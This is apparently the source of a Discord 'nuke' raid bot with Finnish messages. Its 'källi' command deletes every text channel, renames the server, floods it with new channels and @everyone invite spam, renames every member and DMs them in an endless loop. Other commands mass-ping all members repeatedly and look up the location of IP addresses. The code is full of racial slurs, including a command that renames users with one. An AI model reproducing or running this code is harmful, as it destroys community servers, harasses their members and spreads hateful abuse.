import asyncio
from asyncore import loop
import datetime
from itertools import cycle
import socket
import threading
import traceback
import json
import os
import traceback
import time
import random

import discord
import requests
from discord.ext import commands
import colorama
import discord
import requests
from colorama import Fore
from discord.ext import commands


token = ('Tokeni tähä')

prefix = ("!")
RPC = ("Fall made this one ;)")
intents = discord.Intents.all()
intents.invites = True


bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

async def msg_delete(ctx):
    """
    Trying to delete activation message
    """
    try:
        await ctx.message.delete()
    except:
        print(f"Can't delete your message")
        
        
        
@bot.event
async def on_ready():
  print("Im alive bitch")
  await bot.change_presence(status=discord.Status.online,
                            activity=discord.Game(RPC))


@bot.event
async def on_command_error(error, ctx):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send("En haluukkaa toimia :D! Huutista!")


@bot.command()
async def botping(ctx):
  await ctx.send(f'*** Pingi *** {round (bot.latency *1000)}ms')


@bot.command()
async def geoip(ctx, *, ipaddr: str = '9.9.9.9'):
  r = requests.get(f'http://ip-api.com/json/{ipaddr}?fields=192511')

  geo = r.json()
  em = discord.Embed()
  fields = [
      {
          'name': 'IP',
          'value': geo['query']
      },
      {
          'name': 'Country',
          'value': geo['country']
      },
      {
          'name': 'City',
          'value': geo['city']
      },
      {
          'name': 'ISP',
          'value': geo['isp']
      },
      {
          'name': 'Latitute',
          'value': geo['lat']
      },
      {
          'name': 'Longitude',
          'value': geo['lon']
      },
      {
          'name': 'Org',
          'value': geo['org']
      },
      {
          'name': 'Region',
          'value': geo['region']
      },
      {
          'name': 'Status',
          'value': geo['status']
      },
      {
          'name': 'Proxy?',
          'value': geo['proxy']
      },
  ]
  for field in fields:
    if field['value']:
      em.set_footer(text='\u200b')
      em.timestamp = datetime.datetime.utcnow()
      em.add_field(name=field['name'], value=field['value'], inline=True)
  return await ctx.send(embed=em)


@bot.command()
async def pingweb(ctx, website=None):
  if website is None:
    await ctx.send(
        "Vitu taukki laita se sivun osote jos haluut pingaa [tarvii http/https alkuun] :D"
    )
  else:
    try:
      r = requests.get(website).status_code
      t = requests.get(website).elapsed.total_seconds()
    except Exception:
      await ctx.send(embed=discord.Embed(
          title='Ei se toimi noi bro laita linkkinä se :D'))
    if r == 404:
      await ctx.send(embed=discord.Embed(title='Sivu on alhaal bro',
                                         description=f'vastas tilalla: {r}'))
    else:
      await ctx.send(
          embed=discord.Embed(title='Sivu on ylhäällä',
                              description=f'vastas tilalla: {r} Ajassa: {t}'))


@bot.command(name="invite_info")
async def invite_info(ctx, invite_code):
  try:
    invite = await bot.fetch_invite(invite_code)
    await ctx.send(
        f"Invite Info:\n"
        f"Invite koodi: {invite.code}\n"
        f"Servu: {invite.guild.name}\n"
        f"Kanava: {invite.channel.name}\n"
        f"Invaaja: {invite.inviter.name if invite.inviter else 'Joku neekeri vrm en tiiä en löytäny'}\n"
        f"Käytöt: {invite.uses}\n"
        f"Max käyttö kerrat: {invite.max_uses}\n"
        f"Umpeutuu: {invite.expires_at}")
  except discord.errors.NotFound:
    await ctx.send("Invitee ei löytyny :D")
  except discord.errors.HTTPException:
    await ctx.send("Heitti jonku vitu http errori :D")


@bot.command(name='clear')
async def clear(ctx, amount=5):
  if any(role.name == 'clear' for role in ctx.author.roles):
    await ctx.channel.purge(limit=amount + 1
                            )  
    await ctx.send(f'Poistettu {amount} viestii :D')
  else:
    await ctx.send("Ei taida neekerillä olla oikeuksia tämmösee xD")


@bot.event
async def on_message(message):
  if message.author.bot:
    return  

  
  if 'neekeri' in message.content.lower():
    await message.channel.send(
        f'Moro, {message.author.mention}! Kuulin juttuu et oot neekeri. Huutista neekerille :D',
        tts=True)

  await bot.process_commands(message)  

@bot.event
async def on_message(message):
  await asyncio.sleep(0.2)
  if 'https://discord.gg/fallens0ciety' in message.content.lower():
    await message.channel.send('@everyone https://discord.gg/fallens0ciety @everyone')

  await bot.process_commands(message)

@bot.event
async def on_message(message):
  await asyncio.sleep(2)
  if 'https://discord.gg/fallens0ciety' in message.content.lower():
    await message.channel.send('@everyone https://discord.gg/fallens0ciety @everyone')

  await bot.process_commands(message)  
  
  
@bot.event
async def on_message(message):
  await asyncio.sleep(0.5)
  if 'https://discord.gg/fallens0ciety' in message.content.lower():
    await message.channel.send('@everyone Your server has been seized @everyone', tts=True)

  await bot.process_commands(message)  


@bot.command(name="mcresolve")
async def resolve_minecraft_ip(ctx, server_address):
  try:
    ip_address = socket.gethostbyname(server_address)
    response = f"Servun : {server_address} ip on : {ip_address}"
  except socket.error as e:
    response = f"Heitin errori xD: {e}"

  await ctx.send(response)



@bot.command(aliases=["cfx", "fivem", "server"])
async def find(ctx, cfx):
  if "https://cfx.re/join/" in cfx:
    cfxcode = cfx[20:]
  elif "http://cfx.re/join/" in cfx:
    cfxcode = cfx[19:]
  elif "cfx.re/join/" in cfx:
    cfxcode = cfx[12:]
  elif "https://servers.fivem.net/servers/detail/" in cfx:
    cfxcode = cfx[41:]
  elif "http://servers.fivem.net/servers/detail/" in cfx:
    cfxcode = cfx[40:]
  else:
    cfxcode = cfx

  r = requests.get(
      f"https://servers-frontend.fivem.net/api/servers/single/{cfxcode}",
      headers={
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
      })
  if r.text == '{"error": "404 Not Found"}':
    findnieznalembed = discord.Embed(
        title=":x:  Server not found",
        colour=discord.Colour(0xf40552),
        description="The server you specified wasn't found by the bot!")
    findnieznalembed.set_thumbnail(
        url=
        "https://images-ext-1.discordapp.net/external/jPuVkQCmDg9zmBk6xAanj4_l1gJmtnXTBVZ8XPtQxaw/https/freepngimg.com/save/37007-angry-emoji/512x536"
    )
    findnieznalembed.set_footer(
        text="PY-Finder", icon_url="https://cdn.kurwa.club/files/PvE1i.png")
    await ctx.channel.send(embed=findnieznalembed)
  else:
    r = r.json()
    ep = r['EndPoint']
    hn = r['Data']['hostname']
    onlc = r['Data']['clients']
    maxc = r['Data']['sv_maxclients']
    lc = r['Data']['vars']['locale']
    svl = r['Data']['vars']['sv_lan']
    votes = r['Data']['upvotePower']
    iv = r['Data']['iconVersion']
    ip = r['Data']['connectEndPoints'][0]
    size = len(ip)
    ipbez = ip[:size - 6]
    rip = requests.get(f"https://db-ip.com/demo/home.php?s={ipbez}")
    rip = rip.json()
    country = rip['demoInfo']['countryCode']
    city = rip['demoInfo']['city']
    isp = rip['demoInfo']['isp']
    org = rip['demoInfo']['organization']
    build = ""
    bld = requests.get(
        f"https://servers-frontend.fivem.net/api/servers/single/{cfxcode}",
        headers={
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
        })
    if "sv_enforceGameBuild" in bld.text:
      bld = bld.json()
      build = bld['Data']['vars']['sv_enforceGameBuild']
    else:
      build = "1604"

    findznalembed = discord.Embed(
        title=":white_check_mark:  Server found",
        colour=discord.Colour(0xf40552),
        description=
        f"\nCode: `{ep}`\nHostname: `{hn}`\nSlots: `{onlc}/{maxc}`\nBuild: `{build}`\nLocale: `{lc}`\nsv_lan: `{svl}`\nVotes: `{votes}`\n\n\n/info.json: [Click here](http://{ip}/info.json)\n/players.json [Click here](http://{ip}/players.json)\n/dynamic.json [Click here](http://{ip}/dynamic.json)\n\n\nIP: `{ip}`\nCountry: `{country}`\nCity: `{city}`\nISP: `{isp}`\nOrganization: `{org}`\n"
    )
    findznalembed.set_thumbnail(
        url=f"https://servers-live.fivem.net/servers/icon/{ep}/{iv}.png")
    findznalembed.set_footer(text="PY-Finder",
                             icon_url="https://cdn.kurwa.club/files/PvE1i.png")
    await ctx.channel.send(embed=findznalembed)


@bot.command(name='alota')
async def fast_ping_all(ctx):
  global pinging

  
  if ctx.author.guild_permissions.manage_messages:
    if not pinging:
      pinging = True
      await ctx.send('Nopee poika :D')

      while pinging:
      
        for member in ctx.guild.members:
          if not member.bot and member.id != bot.user.id:
            await ctx.send(f'{member.mention} prookoodari nettinörttijuu!')

    else:
      await ctx.send('Juu')

  else:
    await ctx.send('Juu')


@bot.command(name='lopeta')
async def stop_fast_ping(ctx):
  global pinging
  pinging = False
  await ctx.send('Nopee loppy')


@bot.command(name='alotajuu')
async def fast_ping_all(ctx):
  global pinging

  
  if ctx.author.guild_permissions.manage_messages:
    if not pinging:
      pinging = True
      await ctx.send('Nopee poika :D')

      while pinging:
        
        for member in ctx.guild.members:
          if not member.bot and member.id != bot.user.id:
            await member.send(
                '<@917455968013520966> prookoodari nettinörttijuu!')
            await ctx.send(
                f'{member.mention} <@917455968013520966> prookoodari nettinörttijuu!'
            )
    else:
      await ctx.send('Juu')

  else:
    await ctx.send('Juu')


@bot.command(name='källi')
async def spam_with_channels(ctx, amount: int = 25, *, name="We All Love Fall", new_nickname="We All Love Fall"):
    await ctx.message.delete()
    asyncio.create_task(spam_process(ctx, amount, name, new_nickname))

async def spam_process(ctx, amount, name, new_nickname):
    name_options = ["WE", "WE ALL", "WE ALL LOVE", "WE ALL LOVE FALL"]
    
    # Delete channels concurrently
    delete_tasks = [delete_channel(channel) for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*delete_tasks)
    await asyncio.sleep(0.1)

    # Change server name before spamming
    for new_name in name_options:
        await change_server_name(ctx.guild, new_name)
        await asyncio.sleep(1)

    # Main spam loop
    for _ in range(amount):
        create_task = asyncio.create_task(create_channel(ctx, name))
        await asyncio.sleep(0.1)  # Add a small delay after creating channels

    # Change nicknames after spamming
    nickname_tasks = [change_nickname(member, new_nickname) for member in ctx.guild.members if not member.bot]
    await asyncio.gather(*nickname_tasks)

    while True:
        # Send messages concurrently
        send_channel_tasks = [send_message(channel, '@everyone -> https://discord.gg/fallens0ciety <- @everyone') for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
        await asyncio.gather(*send_channel_tasks)
        await asyncio.sleep(0.02)

        send_member_tasks = [send_message(member, 'WeAllLoveFall -> https://discord.gg/fallens0ciety') for member in ctx.guild.members if not member.bot]
        await asyncio.gather(*send_member_tasks)
        await asyncio.sleep(2)


async def delete_channel(channel):
    try:
        await asyncio.sleep(0.4)
        await channel.delete()
        print(f"Deleted channel: {channel.name}")
    except discord.Forbidden:
        print(f'Error deleting channel {channel.name}: Missing permissions')
    except Exception as e:
        print(f'Error deleting channel {channel.name}: {e}')

async def create_channel(ctx, name):
    try:
        await asyncio.sleep(0.6)
        new_channel = await ctx.guild.create_text_channel(name=name)
        print(f"Created channel: {new_channel.name}")
    except discord.Forbidden:
        print(f"Error creating channel: Missing permissions")
    except Exception as e:
        print(f"Can't create channel: {e}")

async def send_message(destination, message):
    try:
        await destination.send(message)
    except discord.Forbidden:
        print(f'Error sending message to {destination.name}: Missing permissions')
    except Exception as e:
        print(f'Error sending message to {destination.name}: {e}')

async def change_nickname(member, new_nickname):
    try:
        await member.edit(nick=new_nickname)
        print(f"Changed nickname for {member.name} to: {new_nickname}")
    except discord.Forbidden:
        print(f'Error changing nickname for {member.name}: Missing permissions')
    except Exception as e:
        print(f'Error changing nickname for {member.name}: {e}')

async def change_server_name(guild, new_name):
    try:
        await guild.edit(name=new_name)
        print(f"Changed server name to: {new_name}")
    except discord.Forbidden:
        print(f'Error changing server name: Missing permissions')
    except Exception as e:
        print(f'Error changing server name: {e}')

@bot.event
async def on_guild_channel_create(channel):
  await asyncio.sleep(0.35)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.25)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.35)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.45)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.55)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.65)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.75)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.85)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(0.95)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(1)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')
  await asyncio.sleep(1.2)
  await channel.send('@everyone -> https://discord.gg/fallens0ciety <- @everyone')

    
    
  
@bot.command(name='nigger')
async def nick_command(ctx, member: discord.Member, *, new_nickname="I Was Niggered."):
    try:
        await member.edit(nick=new_nickname)
        await ctx.send(f"Ei vittu äijä sut justiin neekeröitiin :D")
    except discord.Forbidden:
        await ctx.send("eipä ollu oikeuksia")
    except discord.HTTPException as e:
        await ctx.send(f"kusin alleni: {e}")
        
bot.run('ja vaikka tännekki koska miksiei')


